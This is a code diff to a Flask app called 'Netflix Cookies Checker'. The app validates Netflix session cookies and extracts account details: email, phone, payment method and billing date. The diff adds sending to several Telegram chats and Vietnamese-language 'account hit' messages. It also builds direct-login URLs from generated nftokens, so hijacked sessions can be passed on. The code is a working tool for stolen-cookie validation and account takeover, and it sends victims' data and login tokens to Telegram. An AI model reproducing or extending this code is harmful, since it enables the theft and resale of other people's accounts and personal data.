@@ -28,7 +28,8 @@ OWNER_CREDIT = "Huy Vũ - https://beacons.ai/huyvu2512"
 TELEGRAM_CONFIG = {
     'enabled': False,
     'bot_token': '',
-    'chat_id': ''
+    'chat_id': '',
+    'chat_ids': []
 }
 
 def unescape_plan(s):
@@ -36,6 +37,22 @@ def unescape_plan(s):
         return codecs.decode(s, 'unicode_escape')
     except Exception:
         return s
+
+def format_billing_date(raw):
+    """Convert ISO 8601 billing date to dd/MM/yyyy"""
+    try:
+        raw = raw.replace('\\x2B', '+').replace('%2B', '+').replace('\\x2b', '+')
+        # Strip timezone offset and microseconds before parsing
+        clean = re.sub(r'[+-]\d{2}:?\d{2}$', '', raw.split('.')[0])
+        dt = datetime.strptime(clean, '%Y-%m-%dT%H:%M:%S')
+        return dt.strftime('%d/%m/%Y')
+    except Exception:
+        try:
+            date_part = raw.split('T')[0]
+            y, m, d = date_part.split('-')
+            return f"{d}/{m}/{y}"
+        except Exception:
+            return raw
 
 def extract_netflix_id(content):
     try:
@@ -286,7 +303,7 @@ def check_netflix_cookie(cookie_dict):
             'email_verified': email_verified,
             'email': email,
             'profiles': profiles_str,
-            'next_billing': next_billing,
+            'next_billing': format_billing_date(next_billing),
             'cookie': cookie_dict
         }
     except Exception as e:
@@ -397,191 +414,137 @@ def extract_zip_and_get_files(zip_path, extract_dir):
 
 def send_to_telegram(account_data, filename, original_content=""):
     """Send account information to Telegram with enhanced formatting"""
-    if not TELEGRAM_CONFIG['enabled'] or not TELEGRAM_CONFIG['bot_token'] or not TELEGRAM_CONFIG['chat_id']:
+    chat_ids = TELEGRAM_CONFIG.get('chat_ids', [])
+    if not chat_ids and TELEGRAM_CONFIG.get('chat_id'):
+        chat_ids = [TELEGRAM_CONFIG['chat_id']]
+    if not TELEGRAM_CONFIG['enabled'] or not TELEGRAM_CONFIG['bot_token'] or not chat_ids:
         return False
-    
+
     try:
         bot_token = TELEGRAM_CONFIG['bot_token']
-        chat_id = TELEGRAM_CONFIG['chat_id']
-        print(account_data)
         
-        # Create enhanced formatted message
-        message = "🎬 *NETFLIX ACCOUNT HIT* 🎬\n\n"
-        
-        message += "📋 *BASIC INFO*\n"
+        # Helper: format billing date from ISO 8601 to dd/MM/yyyy
+        def format_billing_date(raw):
+            try:
+                # Replace escaped \x2B with + before parsing
+                raw = raw.replace('\\x2B', '+').replace('%2B', '+')
+                # Parse ISO 8601 (with or without timezone)
+                from datetime import timezone
+                import re as _re
+                # Strip timezone offset for parsing
+                clean = _re.sub(r'[+-]\d{2}:\d{2}$', '', raw.split('.')[0])
+                dt = datetime.strptime(clean, '%Y-%m-%dT%H:%M:%S')
+                return dt.strftime('%d/%m/%Y')
+            except Exception:
+                try:
+                    # Fallback: just grab the date part before T
+                    date_part = raw.split('T')[0]
+                    y, m, d = date_part.split('-')
+                    return f"{d}/{m}/{y}"
+                except Exception:
+                    return raw
+
+        # Create enhanced formatted message (Vietnamese)
+        message = "🎬 *TÀI KHOẢN NETFLIX HỢP LỆ* 🎬\n\n"
+
+        message += "📋 *THÔNG TIN CƠ BẢN*\n"
         message += "▫️ *File:* `{}`\n".format(filename.replace('_', '\_'))
-        message += "▫️ *Time:* `{}`\n".format(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
-        message += "▫️ *Status:* `{}`\n".format("✅ VALID" if account_data['ok'] else "❌ INVALID")
-        message += "▫️ *Premium:* `{}`\n\n".format("👑 YES" if account_data['premium'] else "❌ NO")
-        
-        message += "🌍 *ACCOUNT DETAILS*\n"
+        message += "▫️ *Thời gian:* `{}`\n".format(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
+        message += "▫️ *Trạng thái:* `{}`\n".format("✅ HỢP LỆ" if account_data['ok'] else "❌ KHÔNG HỢP LỆ")
+        message += "▫️ *Premium:* `{}`\n\n".format("👑 CÓ" if account_data['premium'] else "❌ KHÔNG")
+
+        message += "🌍 *CHI TIẾT TÀI KHOẢN*\n"
         message += "```\n"
-        message += "Country:        {}\n".format(account_data['country'])
-        message += "Plan:           {}\n".format(account_data['plan'])
-        message += "Price:          {}\n".format(account_data['plan_price'])
-        message += "Member Since:   {}\n".format(account_data['member_since'])
-        message += "Payment Method: {}\n".format(account_data['payment_method'])
-        message += "Billing Date:   {}\n".format(account_data['next_billing'])
+        message += "Quốc gia:        {}\n".format(account_data['country'])
+        message += "Gói:             {}\n".format(account_data['plan'])
+        message += "Giá:             {}\n".format(account_data['plan_price'])
+        message += "Thành viên từ:   {}\n".format(account_data['member_since'])
+        message += "Phương thức TT:  {}\n".format(account_data['payment_method'])
+        message += "Ngày gia hạn:    {}\n".format(account_data['next_billing'])
         message += "```\n\n"
-        
-        message += "👤 *PROFILE INFORMATION*\n"
+
+        message += "👤 *THÔNG TIN HỒ SƠ*\n"
         message += "```\n"
-        message += "Email:          {}\n".format(account_data['email'].replace('\\x40', '@'))
-        message += "Email Verified: {}\n".format(account_data['email_verified'])
-        message += "Phone:          {}\n".format(account_data['phone'])
-        message += "Phone Verified: {}\n".format(account_data['phone_verified'])
-        message += "Profiles:       {}\n".format(account_data['profiles'])
+        message += "Email:           {}\n".format(account_data['email'].replace('\\x40', '@'))
+        message += "Xác minh Email:  {}\n".format("Có" if account_data['email_verified'] == "Yes" else "Không")
+        message += "Điện thoại:      {}\n".format(account_data['phone'])
+        message += "Xác minh ĐT:     {}\n".format("Có" if account_data['phone_verified'] == "Yes" else "Không")
+        message += "Hồ sơ:           {}\n".format(account_data['profiles'])
         message += "```\n\n"
-        
-        message += "⚙️ *ACCOUNT FEATURES*\n"
+
+        message += "⚙️ *TÍNH NĂNG TÀI KHOẢN*\n"
         message += "```\n"
-        message += "Video Quality:  {}\n".format(account_data['video_quality'])
-        message += "Max Streams:    {}\n".format(account_data['max_streams'])
-        message += "Payment Hold:   {}\n".format(account_data['on_payment_hold'])
-        message += "Extra Member:   {}\n".format(account_data['extra_member'])
+        message += "Chất lượng:      {}\n".format(account_data['video_quality'])
+        message += "Số màn hình:     {}\n".format(account_data['max_streams'])
+        message += "Tạm giữ TT:      {}\n".format("Có" if account_data['on_payment_hold'] == "Yes" else "Không")
+        message += "Thành viên phụ:  {}\n".format("Có" if account_data['extra_member'] == "Yes" else "Không")
         message += "```\n"
+
         nftdata = account_data['cookie']
         message += "🍪 *COOKIES*\n"
         message += "```\n"
         message += "NetflixId={}\n".format(nftdata['NetflixId'])
         message += "```\n"
+
         if account_data.get('token_result', {}).get('status') == 'Success':
             token = account_data['token_result']
             gen_time = datetime.fromtimestamp(token['generation_time']).strftime('%Y-%m-%d %H:%M:%S')
             exp_time = datetime.fromtimestamp(token['expires']).strftime('%Y-%m-%d %H:%M:%S')
-            
+
             days = token['time_remaining'] // 86400
             hours = (token['time_remaining'] % 86400) // 3600
             minutes = (token['time_remaining'] % 3600) // 60
             seconds = token['time_remaining'] % 60
-            
-            message += "\n🔑 *TOKEN INFORMATION*\n"
+
+            message += "\n🔑 *THÔNG TIN TOKEN*\n"
             message += "```\n"
-            message += "Status:         {}\n".format(token['status'])
-            message += "Generation:     {}\n".format(gen_time)
-            message += "Expiry:         {}\n".format(exp_time)
-            message += "Time Remaining: {}d {}h {}m {}s\n".format(days, hours, minutes, seconds)
+            message += "Trạng thái:      {}\n".format(token['status'])
+            message += "Tạo lúc:         {}\n".format(gen_time)
+            message += "Hết hạn:         {}\n".format(exp_time)
+            message += "Còn lại:         {}d {}h {}m {}s\n".format(days, hours, minutes, seconds)
             message += "```\n\n"
-            
-            message += "🔗 *DIRECT LOGIN*\n"
-            message += "`{}`\n\n".format(token['direct_login_url'])
-            
-            #message += "📎 *TOKEN*\n"
-            #message += "`{}`\n".format(token['token'])
-            
-        message += "\n" + "━" * 35 + "\n"
-        message += "🤖 *Generated by Netflix Cookies Checker*\n"
-        message += "👤 *Owner:* `Huy Vũ - https://beacons.ai/huyvu2512`"
 
-        # Create detailed file content
-        file_content = "╔══════════════════════════════════════════╗\n"
-        file_content += "║           NETFLIX ACCOUNT DETAILS         ║\n"
-        file_content += "╚══════════════════════════════════════════╝\n\n"
-        
-        file_content += "📅 Generated: {}\n".format(datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
-        file_content += "📁 Filename: {}\n\n".format(filename)
-        
-        file_content += "🔐 ACCOUNT STATUS\n"
-        file_content += "├─ Status: {}\n".format("VALID" if account_data['ok'] else "INVALID")
-        file_content += "├─ Premium: {}\n".format("YES" if account_data['premium'] else "NO")
-        file_content += "└─ Country: {}\n\n".format(account_data['country'])
-        
-        file_content += "💳 SUBSCRIPTION DETAILS\n"
-        file_content += "├─ Plan: {}\n".format(account_data['plan'])
-        file_content += "├─ Price: {}\n".format(account_data['plan_price'])
-        file_content += "├─ Member Since: {}\n".format(account_data['member_since'])
-        file_content += "├─ Payment Method: {}\n".format(account_data['payment_method'])
-        file_content += "└─ Next Billing: {}\n\n".format(account_data['next_billing'])
-        
-        file_content += "👤 PROFILE INFORMATION\n"
-        file_content += "├─ Email: {}\n".format(account_data['email'].replace('\\x40', '@'))
-        file_content += "├─ Email Verified: {}\n".format(account_data['email_verified'])
-        file_content += "├─ Phone: {}\n".format(account_data['phone'])
-        file_content += "├─ Phone Verified: {}\n".format(account_data['phone_verified'])
-        file_content += "└─ Profiles: {}\n\n".format(account_data['profiles'])
-        
-        file_content += "⚙️ ACCOUNT FEATURES\n"
-        file_content += "├─ Video Quality: {}\n".format(account_data['video_quality'])
-        file_content += "├─ Max Streams: {}\n".format(account_data['max_streams'])
-        file_content += "├─ Payment Hold: {}\n".format(account_data['on_payment_hold'])
-        file_content += "└─ Extra Member: {}\n\n".format(account_data['extra_member'])
-        
-        file_content += "🍪 *COOKIES*\n"
-        file_content += "NetflixId={}\n\n".format(nftdata['NetflixId'])
-        
-        
-        if account_data.get('token_result', {}).get('status') == 'Success':
-            token = account_data['token_result']
-            file_content += "🔑 TOKEN INFORMATION\n"
-            file_content += "├─ Status: {}\n".format(token['status'])
-            file_content += "├─ Generation Time: {}\n".format(datetime.fromtimestamp(token['generation_time']).strftime('%Y-%m-%d %H:%M:%S'))
-            file_content += "├─ Expiry: {}\n".format(datetime.fromtimestamp(token['expires']).strftime('%Y-%m-%d %H:%M:%S'))
-            file_content += "├─ Time Remaining: {}d {}h {}m {}s\n".format(
-                token['time_remaining'] // 86400,
-                (token['time_remaining'] % 86400) // 3600,
-                (token['time_remaining'] % 3600) // 60,
-                token['time_remaining'] % 60
+            # Mobile login URL (unsupported endpoint)
+            mobile_url = "https://netflix.com/unsupported?nftoken={}".format(token['token'])
+            # Desktop login URL (account endpoint, URL-encoded token)
+            desktop_url = "https://www.netflix.com/account?nftoken={}".format(
+                urllib.parse.quote(token['token'], safe='')
             )
-            #file_content += "├─ Token: {}\n".format(token['token'])
-            file_content += "└─ Login URL: {}\n\n".format(token['direct_login_url'])
-        
-        file_content += "━" * 45 + "\n"
-        file_content += "Generated by Netflix Cookies Checker\n"
-        file_content += "Owner: Huy Vũ - https://beacons.ai/huyvu2512\n"
-        file_content += "━" * 45 + "\n"
 
-        # Create temporary file
-        temp_file = tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8')
-        temp_file.write(file_content)
-        temp_file.flush()
-        
-        # Send message to Telegram
+            message += "📱 *ĐĂNG NHẬP ĐIỆN THOẠI*\n"
+            message += "`{}`\n\n".format(mobile_url)
+
+            message += "🖥️ *ĐĂNG NHẬP MÁY TÍNH*\n"
+            message += "`{}`\n\n".format(desktop_url)
+
+        message += "\n" + "━" * 26 + "\n"
+        message += "🤖 Được tạo bởi Netflix Cookies Checker\n"
+        message += "👤 Chủ sở hữu: @huyvu2512"
+
+        # Send message to all Chat IDs
         url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
-        payload = {
-            'chat_id': chat_id,
-            'text': message,
-            'parse_mode': 'Markdown',
-            'disable_web_page_preview': True
-        }
-        
-        response = requests.post(url, data=payload, timeout=10, verify=False)
-        
-        if response.status_code == 200:
-            # Send file
-            url = f"https://api.telegram.org/bot{bot_token}/sendDocument"
-            files = {
-                'document': (f'netflix_{filename}_{int(time.time())}.txt', open(temp_file.name, 'rb'))
+        success_count = 0
+        for cid in chat_ids:
+            payload = {
+                'chat_id': cid,
+                'text': message,
+                'parse_mode': 'Markdown',
+                'disable_web_page_preview': True
             }
-            data = {
-                'chat_id': chat_id,
-                'caption': f'📄 Complete details for `{filename}`'
-            }
-            
-            response = requests.post(url, files=files, data=data, timeout=10, verify=False)
-            
-            # Clean up temp file
-            os.unlink(temp_file.name)
-            
-            if response.status_code == 200:
-                logger.info(f"Successfully sent account info to Telegram for {filename}")
-                return True
+            resp = requests.post(url, data=payload, timeout=10, verify=False)
+            if resp.status_code == 200:
+                success_count += 1
             else:
-                logger.error(f"Failed to send file to Telegram: {response.text}")
-                return False
+                logger.error(f"Failed to send to {cid}: {resp.text}")
+
+        if success_count > 0:
+            logger.info(f"Sent to {success_count}/{len(chat_ids)} Chat IDs for {filename}")
+            return True
         else:
-            logger.error(f"Failed to send message to Telegram: {response.text}")
-            # Clean up temp file
-            os.unlink(temp_file.name)
             return False
-            
+
     except Exception as e:
         logger.error(f"Error sending to Telegram: {str(e)}")
-        # Clean up temp file if it exists
-        try:
-            if 'temp_file' in locals():
-                os.unlink(temp_file.name)
-        except:
-            pass
         return False
 
 @app.route('/')
@@ -598,9 +561,14 @@ def set_telegram_config():
         data = request.get_json()
         TELEGRAM_CONFIG['enabled'] = data.get('enabled', False)
         TELEGRAM_CONFIG['bot_token'] = data.get('bot_token', '')
-        TELEGRAM_CONFIG['chat_id'] = data.get('chat_id', '')
-        
-        logger.info(f"Telegram config updated: enabled={TELEGRAM_CONFIG['enabled']}")
+        # Support both array (new) and single (legacy)
+        chat_ids = data.get('chat_ids', [])
+        if not chat_ids and data.get('chat_id'):
+            chat_ids = [data.get('chat_id')]
+        TELEGRAM_CONFIG['chat_ids'] = chat_ids
+        TELEGRAM_CONFIG['chat_id'] = chat_ids[0] if chat_ids else ''
+
+        logger.info(f"Telegram config updated: enabled={TELEGRAM_CONFIG['enabled']}, chat_ids={len(chat_ids)}")
         
         return jsonify({
             'status': 'success',
@@ -621,6 +589,7 @@ def check_cookie():
         data = request.get_json()
         content = data.get('content', '')
         mode = data.get('mode', 'fullinfo')
+        send_telegram = data.get('send_telegram', False)
         original_content = content
         
         if not content:
@@ -646,8 +615,8 @@ def check_cookie():
                 "owner": OWNER_CREDIT
             }
             
-            # Send to Telegram if enabled and account is valid
-            if TELEGRAM_CONFIG['enabled'] and account_info["ok"]:
+            # Send to Telegram only when explicitly requested (send-telegram-btn)
+            if send_telegram and TELEGRAM_CONFIG['enabled'] and token_result.get('status') == 'Success':
                 telegram_sent = send_to_telegram({
                     **account_info,
                     'token_result': token_result
@@ -835,5 +804,5 @@ def batch_check():
 
 if __name__ == '__main__':
 
-    app.run(debug=True, host='0.0.0.0', port=5000)
+    app.run(debug=True, host='0.0.0.0', port=3000)
 
